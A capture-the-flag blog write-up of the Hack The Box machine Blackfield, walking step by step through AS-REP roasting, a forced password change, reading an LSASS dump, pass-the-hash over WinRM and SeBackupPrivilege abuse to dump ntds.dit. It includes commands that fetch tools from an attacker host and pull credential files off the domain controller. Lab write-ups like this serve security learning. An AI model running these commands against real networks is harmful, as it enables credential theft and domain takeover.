---
title: 'HTB Blackfield - Hard'
date: 2024-07-17 00:00:00 +0000
categories: [HTB Machines]
tags: [Hard, Windows, HTB]
---

**Blackfield** is a hard HTB machine where you need to discover an **AS-REP roastable user** by creating a custom username wordlist, leveraging information leakage from publicly accessible SMB shares. The user flag can be obtained by abusing the **ForceChangePassword** object permission over another domain user. Subsequently, an **LSASS process backup** containing a valid hash will lead you to a high-privileged user with the **SeBackupPrivilege**, providing an easy path to Domain Admins. It's a really fun machine :)

<img src="/assets/img/blackfield/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.229.17

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.229.17 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

53, 88, 135, 139, 445, 3268

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.229.17 -sVC -p53,88,135,139,445,3268

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 13:49 WEST
Nmap scan report for 10.129.229.17
Host is up (0.053s latency).

PORT     STATE    SERVICE       VERSION
53/tcp   open     domain        Simple DNS Plus
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-17 19:49:18Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  filtered netbios-ssn
445/tcp  open     microsoft-ds?
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-17T19:49:25
|_  start_date: N/A
|_clock-skew: 7h00m05s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.50 seconds

[+] Script finished successfully
```

Appended the newly discovered domain and hostname to */etc/hosts*.

```bash
echo -e "10.129.229.17\tblackfield.local dc01.blackfield.local" | sudo tee -a /etc/hosts
10.129.229.17   blackfield.local dc01.blackfield.local
```

SMB anonymous login is enabled. We have read access to a non-default share called *profiles$*.

```bash
netexec smb 10.129.229.17 -u "anonymous" -p "" --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\anonymous: 
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON                        Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL                          Logon server share
```

The share contains over 300 usernames in the same format.

```bash
smbclient -N //10.129.229.17/profiles\$ -c ls | head 
  .                                   D        0  Wed Jun  3 17:47:12 2020
  ..                                  D        0  Wed Jun  3 17:47:12 2020
  AAlleni                             D        0  Wed Jun  3 17:47:11 2020
  ABarteski                           D        0  Wed Jun  3 17:47:11 2020
  ABekesz                             D        0  Wed Jun  3 17:47:11 2020
  ABenzies                            D        0  Wed Jun  3 17:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 17:47:11 2020
  AChampken                           D        0  Wed Jun  3 17:47:11 2020
  ACheretei                           D        0  Wed Jun  3 17:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 17:47:11 2020
  
smbclient -N //10.129.229.17/profiles\$ -c ls | wc -l
318
```

Created a wordlist with the usernames. We may need it in the future.

```bash
smbclient -N //10.129.229.17/profiles\$ -c ls | awk '{print $1}' | grep -oP '[A-Za-z]+' > users.list
```

# Exploitation

There is no HTTP server, LDAP port TCP/389 is closed, SNMP has nothing of interest… Let’s try common Active Directory attacks that don't need authentication, such as AS-REP roasting.

```bash
impacket-GetNPUsers -request -dc-ip 10.129.229.17 blackfield.local/
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```

[Kerbrute](https://github.com/ropnop/kerbrute) discovered a valid user, *support*. Remember that enumerating users this way is much more stealthier and fast because we generate 4768 error logs instead of the common 4625.

```bash
~/Desktop/tools/kerbrute_linux_amd64 userenum -d blackfield.local --dc dc01.blackfield.local users.list

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/17/24 - Ronnie Flathers @ropnop

2024/07/17 14:07:12 >  Using KDC(s):
2024/07/17 14:07:12 >   dc01.blackfield.local:88

2024/07/17 14:09:26 >  [+] VALID USERNAME:       support@blackfield.local
2024/07/17 14:10:00 >  Done! Tested 315 usernames (1 valid) in 168.320 seconds
```

The *support* user was AS-REP roastable! Now, we could crack the hash or try to kerberoast another user .

```bash
impacket-GetNPUsers -request -dc-ip 10.129.229.17 blackfield.local/support                             
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Cannot authenticate support, getting its TGT
$krb5asrep$23$support@BLACKFIELD.LOCAL:988f98595055d9f9234c3e11891da143$ee...
```

Fortunately, the password was weak and we could crack it :DD

```bash
hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt --show | tail -c 20
...f02:<REDACTED>
```

*NetExec* confirmed that the creds are valid. However, we still don’t have access to the *forensic* share.

```bash
netexec smb 10.129.229.17 -u "support" -p "<REDACTED>" --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:<REDACTED> 
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share
```

# Lateral Movement 1

There are not kerberoastable users. We can spray the obtained credentials or run [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) and see how it goes. I will do the second.

```bash
bloodhound-python -u support -p '<REDACTED>' -c all -d blackfield.local -ns 10.129.229.17
```

The *Support* user has *ForceChangePassword* rights over *Audit2020*.

<img src="/assets/img/blackfield/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

[BloodyAD](https://github.com/CravateRouge/bloodyAD) failed because TCP/389 is closed, but we managed to do it via RPC as follows.

```bash
rpcclient -U 'blackfield.local\\support%<REDACTED>' 10.129.229.17

rpcclient $> setuserinfo2 audit2020 23 Dusk3d123!

rpcclient $> quit
```

*NetExec* validated the credentials and discovered read access to *forensic*, the other non-default SMB share.

```bash
netexec smb 10.129.229.17 -u "audit2020" -p 'Dusk3d123!' --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:Dusk3d123! 
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share
```

# Lateral Movement 2

The share contains some directories of interest.

```bash
smbclient -U blackfield.local\\audit2020%'Dusk3d123!' //10.129.229.17/forensic -c ls
  .                                   D        0  Sun Feb 23 13:03:16 2020
  ..                                  D        0  Sun Feb 23 13:03:16 2020
  commands_output                     D        0  Sun Feb 23 18:14:37 2020
  memory_analysis                     D        0  Thu May 28 21:28:33 2020
  tools                               D        0  Sun Feb 23 13:39:08 2020

                5102079 blocks of size 4096. 1694052 blocks available
```

My eyes rolled back when I saw  *domain_admins.txt* on my screen XDD.

```bash
smbclient -U blackfield.local\\audit2020%'Dusk3d123!' //10.129.229.17/forensic -c "ls commands_output/"
  .                                   D        0  Sun Feb 23 18:14:37 2020
  ..                                  D        0  Sun Feb 23 18:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 13:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 12:51:52 2020
  domain_users.txt                    A    16454  Fri Feb 28 22:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 12:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 12:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 12:51:01 2020
  route.txt                           A     3976  Sun Feb 23 12:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 12:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 12:54:29 2020

                5102079 blocks of size 4096. 1693972 blocks available
```

<img src="/assets/img/blackfield/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

Apparently, our ‘client’ does not have a strong background, but they are working on it x)).

```bash
smbclient -U blackfield.local\\audit2020%'Dusk3d123!' //10.129.229.17/forensic -c "cd commands_output; get domain_admins.txt"
getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)

cat domain_admins.txt                
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator       Ipwn3dYourCompany     
The command completed successfully.
```

The *memory_analysis* directory has a file called *lsass.zip*. This might be a dump of the LSASS process.

```bash
smbclient -U blackfield.local\\audit2020%'Dusk3d123!' //10.129.229.17/forensic -c "ls memory_analysis/"
  .                                   D        0  Thu May 28 21:28:33 2020
  ..                                  D        0  Thu May 28 21:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 21:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 21:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 21:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 21:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 21:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 21:25:08 2020
	...

                5102079 blocks of size 4096. 1694115 blocks available
```

Downloaded and extracted the content. We were right, it contains a backup of the LSASS process. 

```bash
smbclient -U blackfield.local\\audit2020%'Dusk3d123!' //10.129.229.17/forensic -c "cd memory_analysis; get lsass.zip" -t 240
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (302.9 KiloBytes/sec) (average 302.9 KiloBytes/sec)

unzip lsass.zip 
Archive:  lsass.zip
  inflating: lsass.DMP
```

Note: Remember to increase the timeout using the `-t 240` flag because of the file size.

*Pypykatz* returned three valuable hashes. Let’s try luck.

```bash
pypykatz lsa minidump lsass.DMP

== MSV ==
Username: DC01$
Domain: BLACKFIELD
LM: NA
NT: <REDACTED>

Username: svc_backup
Domain: BLACKFIELD
LM: NA
NT: <REDACTED>

Username: Administrator
Domain: BLACKFIELD
LM: NA
NT: <REDACTED>
```

The *svc_backup* user’s credentials are still valid. I’m starting to check WinRM after SMB even if the Nmap scan didn’t show that WinRM was open (TCP/5985) because [nmap4lazy](https://github.com/duskb1t/nmap4lazy) uses the `--min-rate` flag and it can cause false negatives if the connection is not stable.

```bash
netexec smb 10.129.229.17 -u "svc_backup" -H <REDACTED>
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:<REDACTED>

netexec winrm 10.129.229.17 -u "svc_backup" -H <REDACTED>
WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.129.229.17   5985   DC01             [+] BLACKFIELD.local\svc_backup:<REDACTED> (Pwn3d!)
```

Connected over WinRM and retrieved the user flag. Noice!

```
evil-winrm -u svc_backup -H <REDACTED> -i dc01.blackfield.local

*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup

*Evil-WinRM* PS C:\Users\svc_backup\Documents> hostname
DC01

*Evil-WinRM* PS C:\Users\svc_backup\Documents> type c:\users\svc_backup\desktop\user.txt
3920bb317a0bef51****************
```

# PrivEsc

Listing the current user privileges reveals the *SeBackupPrivilege*.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Created this script from my CPTS notes, saving it as *script.txt.*

```
set verbose on 
set metadata C:\Windows\Temp\meta.cab 
set context clientaccessible 
set context persistent 
begin backup 
add volume C: alias cdrive 
create 
expose %cdrive% E: 
end backup 
exit 
```

Note: afaik all lines must end with a space ‘ ‘.

Uploaded the script and the two DLLs from [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege).

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> iwr -uri http://10.10.14.37/SeBackupPrivilegeCmdLets.dll -outfile ./SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc_backup\Documents> iwr -uri http://10.10.14.37/SeBackupPrivilegeUtils.dll -outfile ./SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc_backup\Documents> iwr -uri http://10.10.14.37/script.txt -outfile ./script.txt
*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls

    Directory: C:\Users\svc_backup\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/17/2024   2:31 PM            197 script.txt
-a----        7/17/2024   2:31 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----        7/17/2024   2:31 PM          16384 SeBackupPrivilegeUtils.dll
```

Loaded the two DLLs with `ipmo` and created a shadow copy of C:\\.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Set-SeBackupPrivilege
*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow.exe /s .\script.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  7/17/2024 2:34:43 PM

...
-> expose %cdrive% E:
-> %cdrive% = {33bd62b6-1506-4e1b-915b-eb9a7128cb2c}
The shadow copy was successfully exposed as E:\.
-> end backup
-> exit
```

We are in a Domain Controller, so let’s copy NTDS and SYSTEM to the current directory and download them. Very similar to what we did in [VL Baby - Easy](https://duskb1t.github.io/posts/vl-baby/) but it is slow af zzzzzZZZZZZ.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege E:\Windows\System32\config\SYSTEM .\SYSTEM

*Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit .\ntds.dit

*Evil-WinRM* PS C:\Users\svc_backup\Documents> download SYSTEM
                                        
*Evil-WinRM* PS C:\Users\svc_backup\Documents> download ntds.dit
```

<img src="/assets/img/blackfield/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

Dumped the hashes from NTDS.dit, including the Domain Administrator one.

```bash
impacket-secretsdump -ntds ntds.dit local -system SYSTEM      
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:<REDACTED>:::
...
```

Connected as the Domain Administrator via WinRM and read the root flag. GGs!

```
evil-winrm -u administrator -i dc01.blackfield.local -H <REDACTED>

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
DC01

*Evil-WinRM* PS C:\Users\Administrator\Documents> type c:\users\administrator\desktop\root.txt
4375a629c7c67c8e****************
```